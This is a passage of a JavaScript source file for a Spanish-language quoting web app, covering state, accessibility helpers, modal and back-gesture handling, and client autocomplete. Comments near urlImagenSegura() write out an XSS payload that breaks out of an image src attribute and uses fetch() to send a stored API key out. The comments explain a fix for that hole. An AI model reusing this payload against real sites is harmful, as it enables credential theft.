/* ============================================================================
   Cotizador · nucleo.js

   Estado (Q), ayudantes de pantalla, los siete modales y el «atrás» del teléfono, preferencias, clientes conocidos y el cálculo del precio.

   Es un script CLÁSICO, no un módulo ES, y el orden de carga lo fija cotizador.html. Los
   once archivos comparten el mismo ámbito global —como cuando eran un solo <script> en
   línea—, así que un `let` o una `function` de un archivo se ve desde los demás, y los
   273 manejadores en línea del marcado (onclick, oninput…) siguen resolviendo contra ese
   ámbito. Portarlo a módulos ES los dejaría mudos en silencio: ver js/mod/cotizador.js.

   Hasta septiembre de 2026 todo esto vivía en línea dentro de cotizador.html, en un solo
   bloque de diez mil líneas. Se repartió por dominio, sin cambiar una línea de lógica.
   ============================================================================ */

/* Icono en línea para el HTML que se arma desde JS. Mismo sprite que el markup. */
function ico(n,cls){return '<svg class="svgi'+(cls?' '+cls:'')+'" aria-hidden="true"><use href="#'+n+'"/></svg>';}


/* ===================== Estado ===================== */
const Q = {
  proy:'', cliente:'', tel:'', direccion:'', fecha:'', maps:'', folio:'', entrecalles:'', entrega:'', dirRaw:'',
  notaCliente:'',
  /* El plazo de taller elegido a mano: 1 a 5, o null cuando nadie lo tocó y manda el que se
     propone desde las partidas. Ver pintarPlazo(). */
  plazoK:null,
  items:[], iva:true,
  estado:'borrador', rol:'vendedor',
  autorizador:'', nota:'', fechaAuth:'',
  anti:0, antiManual:false,
  precioAuth:0,
  itemsAuth:{},
  /* Huella del trabajo sobre el que se autorizó el precio. Ver authVigente(). */
  huellaAuth:'',
  aiFile:null,
  /* «Esta cotización nunca ha tenido una partida». Va en Q y no en una variable suelta
     porque tiene que sobrevivir a una recarga: se captura el cliente, se recarga la
     página con el candado todavía puesto y al escribir el teléfono la partida en blanco
     del arranque tiene que aparecer igual. Se apaga en cuanto nace la primera y ya no se
     vuelve a encender, que es lo que distingue sembrar de resucitar. */
  sinEstrenar:true,
  editMode:false
};
let pid=0, dragId=null;

/* ===================== Helpers ===================== */
const $=id=>document.getElementById(id);
const plCot=n=>n+(n===1?' cotización':' cotizaciones');
const money=n=>'$'+Number(n||0).toLocaleString('es-MX',{minimumFractionDigits:2,maximumFractionDigits:2});
/* El apóstrofo también: los cinco onclick que pasan un folio lo delimitan con comilla
   simple —onclick="reabrirDeHistorial('${esc(e.folio)}')"—, así que un folio con apóstrofo
   se salía del literal. Del teclado no hay camino (los folios los genera folioFmt), pero de
   un respaldo restaurado sí. */
const esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');

/* ----- URLs de imagen que vienen del almacenamiento -----
   El logotipo y la imagen analizada se interpolaban crudos dentro de src="${...}". Los dos
   salen de localStorage, y localStorage se puede llenar con un respaldo que llegó por
   WhatsApp —el README describe justo ese flujo—: un valor como
   x" onerror="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
   rompía el atributo y corría en cada carga de la app, con las API keys a mano. Se acepta
   solo lo que de verdad puede ser una imagen local. */
function urlImagenSegura(u){
  const v=String(u||'');
  /* La prueba de PREFIJO no bastaba, y el comentario de arriba llevaba meses diciendo que sí.
     Se comprobaba el principio de la cadena y se devolvía el resto CRUDO dentro de src="${...}",
     así que un valor como
        data:image/png;" onerror="fetch('https://…?k='+localStorage.getItem('al3d_kxs_gemini'))
     pasaba el filtro —empieza por data:image/png;— y se salía del atributo. Es exactamente el
     ataque que este bloque decía haber cerrado, con el mismo camino de entrada: un respaldo
     restaurado, que el README describe llegando por WhatsApp.
     Escapar es lo que faltaba. Nada de lo que se acepta aquí —un data:, un blob: o el nombre
     del archivo del logotipo— contiene comillas ni ángulos, así que escaparlo no cambia
     ninguna imagen buena y corta todas las malas. */
  return /^(data:image\/(png|jpe?g|svg\+xml|webp|gif);|blob:|logo-al3d)/i.test(v) ? esc(v) : '';
}
/* El archivo analizado también puede ser un PDF, que se enseña en un <iframe>: ahí un
   javascript: sería peor todavía, porque corre en el origen de la app. */
function urlPdfSegura(u){
  const v=String(u||'');
  return /^(data:application\/pdf;|blob:)/i.test(v) ? v : '';
}
const locked=()=>Q.estado!=='borrador'&&!Q.editMode;
/* Accesibilidad: hace que un chip clicable también responda a teclado (Enter/Espacio) */
/* Los interruptores dicen su estado con la clase .on del span, que es puro CSS: tgAria
   la copia al aria-checked del botón que lo envuelve, pegado a donde el JS ya movía la
   clase. */
function tgAria(id){
  const t=document.getElementById(id); if(!t) return;
  const b=t.closest('[role="switch"]');
  if(b) b.setAttribute('aria-checked', t.classList.contains('on')?'true':'false');
}
/* Lo mismo para lo que abre algo en vez de conmutar: las miniaturas que abren el
   lightbox eran <img> con onclick y nada más, o sea invisibles para el teclado. Sin
   aria-pressed, que aquí no hay estado que anunciar. */
const _ABRIBLE=`role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click();}"`;
/* Los cuatro segmentados decían cuál está puesto solo con el color de fondo: se oía
   «Letras botón, Recorte botón, Bastidor botón…» sin ninguna pista del tipo de la
   partida. segAria copia al aria-pressed la MISMA clase que ya usaba el CSS (.on o
   .active), así que se llama pegado al bucle que la mueve y no hay un segundo estado
   que se pueda desincronizar. Se queda en aria-pressed y no en role=radio a propósito:
   un radiogroup sin navegación por flechas promete un patrón que aquí no existe. */
function segAria(sel){
  document.querySelectorAll(sel).forEach(b=>b.setAttribute('aria-pressed',
    (b.classList.contains('on')||b.classList.contains('active'))?'true':'false'));
}

/* ----- Llevar algo a la vista -----
   La barra de arriba queda fija: sin restarle su alto, lo que se trae a la vista
   aparece justo debajo de ella y queda medio tapado. Lo que estorba no es el alto de
   la barra sino dónde termina cuando está pegada, que es su desplazamiento (`top`)
   más su alto; en el teléfono ese desplazamiento es negativo a propósito, porque la
   fila de la marca se va con el scroll. */
function altoTopbarFija(){
  const tb=document.querySelector('.topbar');
  if(!tb) return 0;
  const top=parseFloat(getComputedStyle(tb).top)||0;
  return Math.max(0,tb.offsetHeight+top);
}
function irA(el,extra=12){
  if(typeof el==='string') el=$(el);
  if(!el) return;
  const y=el.getBoundingClientRect().top+window.pageYOffset-altoTopbarFija()-extra;
  // scroll-behavior del CSS no alcanza a un scrollTo programático: se pregunta aquí
  const suave=!window.matchMedia('(prefers-reduced-motion:reduce)').matches;
  window.scrollTo({top:Math.max(0,y),behavior:suave?'smooth':'auto'});
}
/* ----- La marca no se queda pegada en el teléfono -----
   La barra de arriba se lleva 115 px de una pantalla de 664: dos renglones, y el de
   arriba es solo el logotipo. Con un desplazamiento negativo del alto exacto de esa
   fila, la marca se va con el scroll y lo que permanece pegado es el renglón útil
   —folio, rol e historial—. Se recalcula porque el alto de la marca cambia: al subir
   un logotipo propio, al girar el teléfono o al cambiar el tamaño de letra del sistema. */
function ajustarTopbarMovil(){
  const tb=document.querySelector('.topbar'), marca=$('brandLogo');
  if(!tb||!marca) return;
  if(!window.matchMedia('(max-width:560px)').matches){ tb.style.top=''; document.documentElement.style.setProperty('--top-fijo',altoTopbarFija()+'px'); return; }
  const fila=tb.querySelector('.topbar-in');
  const hueco=parseFloat(getComputedStyle(fila).rowGap)||0;
  tb.style.top=(3-Math.round(marca.offsetHeight+hueco))+'px';
  document.documentElement.style.setProperty('--top-fijo',altoTopbarFija()+'px');
}
window.addEventListener('resize',ajustarTopbarMovil);
/* Las cotas del escalador se miden y se dibujan en el lienzo con Inter. Si la fuente
   llega después del primer trazado, el hueco de cada etiqueta queda medido con la
   fuente de reserva. Al terminar de cargar se repinta y se reajusta la barra. */
if(document.fonts&&document.fonts.ready){
  document.fonts.ready.then(()=>{
    ajustarTopbarMovil();
    if(typeof SC!=='undefined'&&SC.img){scFitCanvas();scRender();}
  }).catch(()=>{});
}
window.addEventListener('orientationchange',()=>setTimeout(ajustarTopbarMovil,180));
function irAResumen(){ irA('sidebox'); }
/* Llevar la vista Y el foco. irA() solo hace scroll, y un destino al que el teclado no llega no
   es un destino: el siguiente tabulador seguía saliendo de la pestaña que se tocó, arriba del
   todo. tabIndex=-1 lo hace enfocable sin meterlo en el recorrido del tabulador. */
function _anclarPaso(id){
  const el=$(id); if(!el) return;
  irA(id);
  el.tabIndex=-1;
  try{ el.focus({preventScroll:true}); }catch(_){ }
}

/* ----- Precios difuminados mientras es borrador -----
   La clase va en <body> y no en cada importe: las partidas y la barra de abajo se
   vuelven a pintar constantemente, y así los importes nuevos nacen ya tapados sin que
   nadie tenga que acordarse de volver a marcarlos.
   El autorizador nunca los ve tapados: su trabajo es justamente mirar el precio. */
function aplicarBlurPrecios(){
  const tapar = Q.estado==='borrador' && Q.rol!=='autorizador';
  document.body.classList.toggle('precios-ocultos',tapar);
  if(!tapar) document.body.classList.remove('precios-a-la-vista');
  const b=$('precios-ver');
  /* La nota y la etiqueta del botón se resincronizan aquí: al volver a borrador se quedaba
     un «Ocultar precios» rancio al lado de unos precios ya tapados. */
  const vista=document.body.classList.contains('precios-a-la-vista');
  if(b){ b.setAttribute('aria-pressed',vista?'true':'false'); b.textContent=vista?'Ocultar precios':'Ver precios'; }
  const n=$('precios-nota-txt'); if(n) n.textContent=vista?'Los precios están a la vista':'Mantén tocado para ver un importe';
}
/* La misma cosa que hace el gesto de mantener tocado, pero sin depender de un dedo: se
   queda destapado hasta que se vuelve a pulsar, porque un teclado no tiene «soltar». */
function togglePreciosALaVista(){
  const v=document.body.classList.toggle('precios-a-la-vista');
  const b=$('precios-ver');
  if(b){ b.setAttribute('aria-pressed',v?'true':'false'); b.textContent=v?'Ocultar precios':'Ver precios'; }
  const n=$('precios-nota-txt'); if(n) n.textContent=v?'Los precios están a la vista':'Mantén tocado para ver un importe';
  voz(v?'Precios a la vista':'Precios ocultos');
}
/* Espiar: se destapan mientras se mantiene tocado y se vuelven a tapar al soltar.
   Los oyentes van en el documento —delegados— porque los importes se rehacen con cada
   cambio y volver a engancharlos en cada pintado se olvidaría en algún camino. */
const _SEL_PRECIO='.lt,#s-sub,#s-iva,#s-neto,#s-calc,#s-anti-rest,.mbar-amt,.anti .inp-money,.partida .inp-money,.formula,.ptok.dinero';
function _espiarPrecios(e){
  if(!document.body.classList.contains('precios-ocultos'))return;
  const t=e.target.closest&&e.target.closest(_SEL_PRECIO);
  if(!t)return;
  // Sobre el campo del anticipo se deja pasar el toque: ahí se escribe
  if(t.classList.contains('inp-money')&&e.target.tagName==='INPUT')return;
  document.body.classList.add('precios-a-la-vista');
  _espiando=true;
}
/* Soltar solo tapa lo que destapó el GESTO. Si los precios están a la vista porque alguien
   pulsó «Ver precios», un toque en cualquier otra parte de la pantalla los volvía a tapar y
   el botón quedaba diciendo «Ocultar precios» sobre unos precios ya ocultos. */
let _espiando=false;
function _dejarDeEspiar(){
  if(!_espiando) return;
  _espiando=false;
  document.body.classList.remove('precios-a-la-vista');
}
document.addEventListener('pointerdown',_espiarPrecios);
document.addEventListener('pointerup',_dejarDeEspiar);
document.addEventListener('pointercancel',_dejarDeEspiar);
window.addEventListener('blur',_dejarDeEspiar);

/* Escape cierra la capa de arriba. Van de la más alta a la más baja por z-index, así
   que con el escalador abierto encima del historial se cierra primero el escalador.
   Cada una se cierra por su propia función, la misma que su botón: así no hay dos
   maneras de cerrar que puedan dejar estados distintos. */
const _CAPAS=[
  ['pdf-fallback',()=>cerrarEnlacePDF()],
  ['lightbox',   ()=>closeLightbox()],
  ['rv-modal-bg',()=>cerrarRegistrarVenta()],
  ['faltmodal',  ()=>cerrarFaltantes()],
  ['aimodal',    ()=>aiClose()],
  ['histmodal',  ()=>cerrarHistorial()],
  ['climodal',   ()=>cerrarCuadernos()],
  ['vectormodal',()=>cerrarVector()],
  ['scalermodal',()=>cerrarScaler()],
];
window.addEventListener('keydown',e=>{
  if(e.key==='Escape'){
    for(const [id,cerrar] of _CAPAS){
      const el=document.getElementById(id);
      if(el&&el.classList.contains('show')){ e.preventDefault(); try{cerrar();}catch(_){} return; }
    }
    return;
  }
  /* El tabulador se escapaba del modal al primer golpe y seguía recorriendo el
     cotizador que está detrás del velo. Solo se interviene en los dos extremos —y
     cuando el foco ya se salió—, así que dentro del modal el orden natural no cambia
     y el <canvas> del escalador no se enreda: dibujar es con el dedo, no con Tab. */
  if(e.key!=='Tab')return;
  const m=_capaDeArriba(); if(!m)return;
  const f=_focablesDe(m); if(!f.length)return;
  const pri=f[0], ult=f[f.length-1], act=document.activeElement;
  if(e.shiftKey){ if(act===pri||!m.contains(act)){ e.preventDefault(); ult.focus(); } }
  else          { if(act===ult||!m.contains(act)){ e.preventDefault(); pri.focus(); } }
});

/* ===================== Semántica de los siete modales =====================
   Cada modal tiene su propio par de funciones (aiOpen/aiClose, abrirHistorial/
   cerrarHistorial, abrirScaler/cerrarScaler…) y todas hacen lo mismo: poner o quitar
   la clase 'show'. En vez de repetir este trabajo en las siete —siete sitios donde uno
   se puede quedar a medias— se vigila esa clase: hay UN solo camino de apertura, el
   mismo que ya usan el botón ×, el "atrás" del teléfono y el Escape de _CAPAS, así que
   no pueden discrepar.
   Lo que faltaba, todo comprobado antes: el foco se quedaba en el botón que abrió el
   modal, detrás del velo; con VoiceOver se podía seguir deslizando hasta los campos
   del cotizador y leerlos como si fueran del modal; y al cerrar el cursor aterrizaba
   al principio del documento y había que volver a bajar hasta la partida. */
const _FOCABLES='a[href],button:not([disabled]),input:not([disabled]):not([type=hidden]),'+
  'select:not([disabled]),textarea:not([disabled]),summary,iframe,[tabindex]:not([tabindex="-1"])';
/* Solo lo que de verdad se dibuja: el modal de IA lleva los tres bloques de proveedor
   en display:none y cada modal esconde su <input type=file>. Sin este filtro el foco
   aterrizaba en un campo invisible. Se mide con getClientRects y no con offsetParent
   porque los modales son position:fixed y ahí offsetParent es null. */
function _focablesDe(m){
  return [...m.querySelectorAll(_FOCABLES)].filter(e=>{
    if(!e.getClientRects().length) return false;
    /* Lo que vive dentro de un <details> plegado tiene caja pero NO acepta el foco.
       checkVisibility lo distingue donde exista; el filtro del <details> cubre el resto
       y no depende de esa API, porque ahí dentro lo único enfocable es su <summary>. */
    if(e.checkVisibility && !e.checkVisibility({visibilityProperty:true})) return false;
    const d=e.closest('details:not([open])');
    return !d || (e.tagName==='SUMMARY' && e.parentElement===d);
  });
}
/* La capa de arriba, leída de _CAPAS, que ya está ordenada por z-index. */
function _capaDeArriba(){
  for(const [id] of _CAPAS){
    const el=document.getElementById(id);
    if(el&&el.classList.contains('show')) return el;
  }
  return null;
}
/* ----- El «atrás» del teléfono cierra la capa, no la app -----
   En Android el gesto de atrás es el «cerrar» universal: no se aprende, se hace. Y son
   justo los teléfonos que el reporte nombra. El escalador y el vectorizador ya lo
   respetaban, cada uno con su propio pushState y su propio popstate; las otras siete capas
   —Historial, Cuadernos, IA, Registrar venta, el aviso de partidas sin terminar, el visor
   de imagen y el respaldo del PDF— no, así que el gesto navegaba el historial del navegador
   y sacaba de la cotización con todo lo capturado a medias.

   No hace falta tocar las siete: el MutationObserver de aquí abajo ya vigila la clase
   'show' de TODAS y llama a _modalAbierto/_modalCerrado. Ese es el único sitio donde hay
   que engancharlo, que es la misma razón por la que el foco y el inerte viven ahí.

   El escalador y el vectorizador se quedan fuera: ya lo hacen ellos y hacerlo dos veces
   metería dos entradas por una capa, o sea dos golpes de atrás para cerrar una cosa. */
const _CAPAS_CON_HIST_PROPIA=new Set(['scalermodal','vectormodal']);
/* Las que se están cerrando PORQUE el usuario dio atrás. Sin esto, _histAlCerrar llamaría
   a history.back() otra vez y el segundo retroceso sí saca de la página. */
const _cerrandoPorAtras=new Set();
function _histAlAbrir(m){
  if(_CAPAS_CON_HIST_PROPIA.has(m.id))return;
  if(m.dataset.hist==='1')return;
  try{ history.pushState({capa:m.id},''); m.dataset.hist='1'; }catch(_){}
}
function _histAlCerrar(m){
  if(m.dataset.hist!=='1')return;
  m.dataset.hist='';
  if(_cerrandoPorAtras.has(m.id)){ _cerrandoPorAtras.delete(m.id); return; }
  /* Se cerró con la ×, con Escape o desde el código: hay que consumir la entrada que se
     empujó al abrir, o el historial se llena de escalones muertos y el atrás no hace nada
     visible las primeras veces.

     La guarda es la misma que js/nucleo/ui.js:229-235 tiene desde hace tiempo, con su misma
     razón: history.back() es ASÍNCRONO, así que si quien cierra abre otra cosa en el mismo
     tick, el back se cruza y se come la entrada recién empujada. Aquí faltaba, y había dos
     botones que hacen exactamente eso —«Clientes» dentro del Historial y «Ver el historial»
     dentro de Cuadernos—, que son justo el gesto de cambiar de pestaña entre dos vistas de los
     mismos datos: el panel nuevo se abría y se cerraba solo. */
  try{ if(history.state&&history.state.capa===m.id) history.back(); }catch(_){}
}
/* La guarda sola no basta para esos dos botones: sin ella el back sobraba, con ella la entrada
   se queda huérfana —la capa que cierra ya no la reclama y la que abre no empuja la suya porque
   _histAlAbrir ve dataset.hist puesto—. Ceder es lo correcto: una sola entrada, que cambia de
   dueño sin tocar el historial. Cero operaciones, y su state.capa diciendo la verdad para la ×
   que venga después. */
function cederEntrada(idCierra,idAbre){
  const a=$(idCierra), b=$(idAbre);
  if(!a||!b||a.dataset.hist!=='1') return;
  if(!(history.state&&history.state.capa===idCierra)) return;
  a.dataset.hist=''; b.dataset.hist='1';
  try{ history.replaceState({...history.state,capa:idAbre},''); }catch(_){}
}
function delHistorialALosClientes(){ cederEntrada('histmodal','climodal'); cerrarHistorial(); abrirCuadernos(); }
function deLosClientesAlHistorial(){ cederEntrada('climodal','histmodal'); cerrarCuadernos(); abrirHistorial(); }
/* ----- El «atrás» también sabe volver de Partidas a Cliente -----
   Las nueve capas modales ya respetaban el gesto de atrás desde hace tiempo (el bloque de aquí
   arriba lo explica). Las DOS PANTALLAS no: `irAPantalla` nunca tocaba el historial, así que en
   la app instalada —manifest.webmanifest dice "display":"standalone"— el gesto de atrás estando
   en Partidas se salía de la cotización con todo lo capturado a medias. Medido antes de
   arreglarlo: desde Partidas, un atrás dejaba la página en about:blank.

   Este oyente va REGISTRADO ANTES que el de las capas, a propósito: los oyentes corren en orden
   de registro, y solo corriendo primero puede ver una capa todavía abierta y cederle el gesto.
   No depende de que ningún otro oyente le avise nada; sus dos guardas son suyas. */
window.addEventListener('popstate',ev=>{
  if(_capaDeArriba()) return;                 // la capa de arriba se queda con este atrás
  const st=ev.state;
  if(!st||!st.cot) return;                    // la entrada no es de las pantallas: no es nuestra
  if(st.pantalla!==_pantalla){
    /* `forzar` porque volver atrás no es capturar: el candado del paso 1 no puede frenar un
       gesto que va HACIA los datos que faltan. `hist:false` porque esta entrada ya existe —la
       estamos consumiendo, no creando— y escribirla otra vez duplicaría el escalón. */
    irAPantalla(st.pantalla,{forzar:true,hist:false,y:st.y});
  }else{
    window.scrollTo({top:st.y||0,behavior:'auto'});
  }
  const c=$('contenido');
  if(c){ c.tabIndex=-1; try{ c.focus({preventScroll:true}); }catch(_){ } }
  voz(_pantalla==='cliente'?'Paso 1 de 4 · Cliente':'Paso 2 de 4 · Partidas');
});
window.addEventListener('popstate',()=>{
  const arriba=_capaDeArriba();
  if(!arriba||arriba.dataset.hist!=='1')return;
  /* Una capa se cierra por este atrás, así que la entrada de pantallas que quedó pendiente
     mientras la capa estaba abierta ya puede escribirse. */
  _pilaPendiente=true;
  _cerrandoPorAtras.add(arriba.id);
  const par=_CAPAS.find(([id])=>id===arriba.id);
  if(par){ try{ par[1](); }catch(_){ _cerrandoPorAtras.delete(arriba.id); } }
});
const _focoAntes=new Map();
/* El fondo entero queda detrás del velo, y no es solo .wrap: la barra de arriba y la
   barra de abajo del celular también. Con inert VoiceOver deja de recorrerlas y el
   tabulador tampoco se escapa por ahí. Se quita en cuanto no queda ninguna capa. */
function _fondoInerte(v){
  document.querySelectorAll('.wrap,.topbar,.mbar').forEach(e=>{ try{ e.inert=v; }catch(_){} });
  document.documentElement.classList.toggle('modal-abierto',v);
}
function _modalAbierto(m){
  /* Antes de inertar: si no, ya se perdió. Y NO se guarda un elemento que vive dentro del
     propio modal ni dentro de otra capa: pasar del vectorizador al escalador —el botón
     «Medir el vector en el escalador» vive dentro del vectorizador, que se cierra— dejaba
     al escalador con un «foco anterior» que se iba a desconectar, así que al cerrarlo el
     cursor aterrizaba al principio del documento. */
  const prev=document.activeElement;
  const dentroDeUnaCapa=prev&&prev.closest&&_CAPAS.some(([id])=>{
    const c=document.getElementById(id); return c&&c.contains(prev);
  });
  _focoAntes.set(m.id,dentroDeUnaCapa?null:prev);
  _histAlAbrir(m);
  _fondoInerte(true);
  const f=_focablesDe(m);
  const d=f[0]||m;
  if(!f.length) m.tabIndex=-1;
  /* En el fotograma siguiente: en iOS enfocar en el mismo golpe que hace visible el
     modal se pierde a veces, y así tampoco se le quita el foco a nada que el propio
     abrir haya enfocado. Se vuelve a comprobar que siga abierto. */
  requestAnimationFrame(()=>{
    if(!m.classList.contains('show'))return;
    try{ d.focus({preventScroll:true}); }catch(_){}
  });
}
function _modalCerrado(m){
  _histAlCerrar(m);
  const arriba=_capaDeArriba();
  if(!arriba) _fondoInerte(false);
  /* Si mientras la capa estaba abierta se cambió de pantalla —el aviso de partidas sin terminar
     lleva a una partida, «usar como base» abre una cotización nueva—, la entrada del historial
     de pantallas quedó sin escribir para no pisarle la suya a la capa. Ya no hay capa: se
     termina ahora. */
  if(!arriba&&_pilaPendiente) sincronizarHistorial(true);
  const a=_focoAntes.get(m.id); _focoAntes.delete(m.id);
  /* Devolver el foco es SÍNCRONO a propósito: irAPartida() cierra el aviso de
     partidas sin terminar y enfoca el campo de la partida en el fotograma siguiente,
     y si esto también esperara un fotograma se lo quitaría después. */
  if(a&&a.isConnected&&a.getClientRects().length&&(!arriba||arriba.contains(a))){
    try{ a.focus({preventScroll:true}); }catch(_){}
  }
  /* Red por debajo: si el que abrió la capa ya no puede recibir el foco —una miniatura
     sin tabindex, un botón que se repintó mientras la capa estaba abierta—, el foco se
     quedaba en el <body> y quien navega con teclado volvía al principio del documento.
     Si queda una capa debajo, el foco se va a su primer control; si no, al menos no se
     deja dentro de algo que ya está inerte. */
  if(arriba&&(document.activeElement===document.body||!arriba.contains(document.activeElement))){
    const alt=_focablesDe(arriba)[0];
    if(alt){ try{ alt.focus({preventScroll:true}); }catch(_){} }
  }
  /* Sin capas debajo y sin foco válido que devolver, el cursor se quedaba en el <body> y
     había que retabular el documento entero. Se ancla en el contenido, que es lo más cerca
     que se puede dejar de donde estaba el usuario. */
  if(!arriba&&document.activeElement===document.body){
    const anc=$('contenido');
    if(anc){ anc.tabIndex=-1; try{ anc.focus({preventScroll:true}); }catch(_){} }
  }
}
const _obsModal=new MutationObserver(regs=>{
  for(const r of regs){
    const m=r.target, ahora=m.classList.contains('show');
    if(ahora===(m.dataset.abierto==='1'))continue;   // la clase cambió, el estado no
    m.dataset.abierto=ahora?'1':'0';
    if(ahora) _modalAbierto(m); else _modalCerrado(m);
  }
});
function _vigilarModales(){
  for(const [id] of _CAPAS){
    const el=document.getElementById(id); if(!el)continue;
    el.dataset.abierto=el.classList.contains('show')?'1':'0';
    _obsModal.observe(el,{attributes:true,attributeFilter:['class']});
  }
}
/* El modal de Registrar Venta está al final del documento, después de este script:
   si se registrara aquí mismo, getElementById devolvería null y ese sería el único
   modal sin foco atrapado. */
if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',_vigilarModales,{once:true});
else _vigilarModales();

/* ----- Decirlo solo al lector de pantalla -----
   Para los cambios que con la vista se entienden de un golpe y sin ella no existen:
   plegar de golpe todas las partidas, por ejemplo. Un aviso emergente ahí sería ruido
   visual por algo que ya se ve.

   El textContent='' y la escritura en el fotograma siguiente son los que hacen que la
   región activa cuente el mensaje como inserción nueva aunque el texto se repita: sin
   eso, «4 partidas plegadas» dos veces seguidas se oye una sola. */
function voz(msg,urgente){
  const el=$(urgente?'vozAlert':'vozStatus'); if(!el) return;
  el.textContent='';
  requestAnimationFrame(()=>{ el.textContent=msg; });
}
/* Aviso emergente. Con un solo temporizador compartido: antes dos avisos seguidos
   se pisaban y el segundo se ocultaba antes de tiempo por el reloj del primero.
   Acepta un botón opcional, por ejemplo para deshacer un borrado. */
let _toastT=null;
function toast(msg,type='',dur=2600,accion=null){
  /* Con botón, 8 s como mínimo: quien lo oye en vez de verlo tiene que encontrar
     «Deshacer» deslizando, y los 2.6 s de siempre no alcanzan ni para llegar. Si el
     llamador ya pide más, se respeta lo que pida. */
  if(accion&&dur<8000) dur=8000;
  const t=$('toast');
  t.innerHTML='';
  const sp=document.createElement('span'); sp.textContent=msg; t.appendChild(sp);
  if(accion&&accion.label&&typeof accion.fn==='function'){
    const b=document.createElement('button');
    b.type='button'; b.className='toast-act'; b.textContent=accion.label;
    b.onclick=()=>{ clearTimeout(_toastT); t.classList.remove('show'); accion.fn(); };
    t.appendChild(b);
  }
  t.className='toast '+type;
  void t.offsetWidth; t.classList.add('show');
  clearTimeout(_toastT);
  _toastT=setTimeout(()=>t.classList.remove('show'),dur);
  /* Todo lo de arriba se escribe con el aviso todavía en visibility:hidden, o sea
     fuera del árbol de accesibilidad: la región activa no veía ninguna mutación, y
     volverlo visible con el texto ya puesto tampoco es una inserción. Ni VoiceOver ni
     TalkBack decían nada —ni «Partida 3 eliminada» con su Deshacer, ni los errores de
     la IA—. Por eso el mensaje se repite en una región que nunca se oculta. */
  voz(msg+(accion&&accion.label?' — '+accion.label+' disponible':''),type==='err');
}

/* Copiar al portapapeles, con respaldo. En iOS y en páginas no seguras la API
   moderna falla; antes cada botón reaccionaba distinto (uno tenía respaldo y los
   otros solo avisaban del error), así que copiar dependía del botón que tocaras. */
function copiarTexto(txt,msgOk,extra){
  const ok=()=>{ if(msgOk) toast(msgOk,'ok',3400); if(typeof extra==='function') extra(); };
  try{
    if(navigator.clipboard&&navigator.clipboard.writeText){
      navigator.clipboard.writeText(txt).then(ok).catch(()=>_copiaManual(txt,ok));
    } else _copiaManual(txt,ok);
  }catch(_){ _copiaManual(txt,ok); }
}

/* ===================== Preferencias del dispositivo =====================
   Datos que se volvían a poner igual en cada cotización —el nombre de quien autoriza,
   el material que casi siempre se usa, el porcentaje de comisión y la cuenta donde
   entra el anticipo—. No son parte de la cotización: son de quien usa este teléfono,
   así que viven fuera de Q y no viajan al historial, al PDF ni a la cola. */
const PREF_AUTORIZADOR='al3d_autorizador', PREF_MATERIAL='al3d_ult_material',
      PREF_RV_PCT='al3d_rv_pct', PREF_RV_CUENTA='al3d_rv_cuenta';
/* La imagen analizada por IA se guarda en su propia clave, no dentro de al3d_q — el
   por qué está en sincronizarAiFile(). Se declara aquí, junto a las demás claves de
   almacenamiento, porque la lista del respaldo la necesita y se arma antes. */
const AI_FILE_KEY='al3d_aifile';
const AI_FILE_MAX=2000000;      // ~2 MB: más que eso no conviene junto al historial
let _aiFileGuardada=null;       // url ya escrita en el almacenamiento, o null si no cupo
let _aiFileFallo=null;          // url que YA se intentó y no cupo: no se reintenta en cada tecla
function prefGet(k,def=''){ try{ const v=localStorage.getItem(k); return v===null?def:v; }catch(_){ return def; } }
function prefSet(k,v){ try{ localStorage.setItem(k,String(v)); }catch(_){} }

/* ===================== Clientes ya conocidos =====================
   El historial ya guardaba nombre, teléfono y dirección de cada cliente autorizado,
   pero el campo Cliente arrancaba vacío siempre: el cliente que regresaba por su
   segundo letrero se tecleaba completo otra vez. Se sugieren los del historial y, al
   elegir uno, se llenan los campos que estén VACÍOS —nunca se pisa lo ya escrito. */
function normNom(s){ return String(s||'').trim().toLowerCase().replace(/\s+/g,' '); }
function clientesConocidos(){
  const m=new Map();
  /* El historial está ordenado de lo más reciente a lo más viejo, así que el primero
     que aparece manda; de los demás solo se toman los huecos que dejó. */
  getHistorial().forEach(e=>{
    const k=normNom(e.cliente); if(!k) return;
    const prev=m.get(k);
    if(!prev){ m.set(k,{cliente:e.cliente,tel:e.tel||'',dirRaw:e.dirRaw||'',maps:e.maps||''}); return; }
    if(!prev.tel&&e.tel) prev.tel=e.tel;
    if(!prev.dirRaw&&e.dirRaw) prev.dirRaw=e.dirRaw;
    if(!prev.maps&&e.maps) prev.maps=e.maps;
  });
  return [...m.values()];
}
function pintarClientes(){
  const dl=$('clientes-conocidos');
  if(dl) dl.innerHTML=clientesConocidos().map(c=>`<option value="${esc(c.cliente)}"></option>`).join('');
  /* Esta función ya corría después de cada escritura del historial y al arrancar, que es
     exactamente cuando el aviso de «ya tiene cuaderno» puede haber cambiado. */
  actualizarAvisoCuaderno();
}
/* «Lo vacié yo, a propósito» — la diferencia que le faltaba a autocompletar.
   Rellenar un campo vacío es lo correcto la primera vez y es un estorbo la segunda: el teléfono
   del cliente estaba mal, vuelves al paso 1, lo borras para reteclearlo, tocas el nombre… y
   autocompletar ve el campo vacío, reconoce al cliente y te devuelve el teléfono VIEJO, con su
   toast de «se llenó el teléfono». La corrección se deshacía sola.
   La marca se cuelga del evento 'input' y NO de upd/updMaps/updDirRaw: esas tres se llaman
   también desde el código con cadena vacía —el propio arranque, deshacerVaciado,
   reabrirDeHistorial, usarComoBase, loadQueueEntry— y marcarían campos que nadie tocó. 'input'
   no se dispara al asignar .value por programa, que es justo la diferencia que hace falta.
   Va por folio, como _paDraft: es de esta captura, no del aparato. */
let _vaciadoAMano=null;
function vaciadoAMano(k){ return !!(_vaciadoAMano&&_vaciadoAMano.folio===Q.folio&&_vaciadoAMano.set.has(k)); }
function marcarVaciado(k,v){
  if(!_vaciadoAMano||_vaciadoAMano.folio!==Q.folio) _vaciadoAMano={folio:Q.folio,set:new Set()};
  if(String(v||'').trim()) _vaciadoAMano.set.delete(k); else _vaciadoAMano.set.add(k);
}
function autocompletarCliente(v){
  if(locked()) return;
  const c=clientesConocidos().find(x=>normNom(x.cliente)===normNom(v));
  if(!c) return;
  const puestos=[];
